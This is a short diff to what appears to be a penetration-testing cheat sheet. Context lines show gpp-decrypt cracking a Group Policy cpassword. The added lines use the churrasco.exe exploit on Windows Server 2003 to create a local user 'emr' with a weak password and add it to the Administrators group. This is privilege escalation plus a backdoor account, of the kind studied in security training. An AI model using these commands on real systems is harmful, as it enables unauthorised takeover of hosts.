@@ -88,3 +88,11 @@ type Groups.xml
 gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
 ```
 
+* **Windows Server 2003**
+
+```
+upload /root/Desktop/test/churrasco.exe C:\\Inetpub\\
+shell
+churrasco.exe “net user emr Password1 /add”
+churrasco.exe “net localgroup Administrator emr /add”
+```
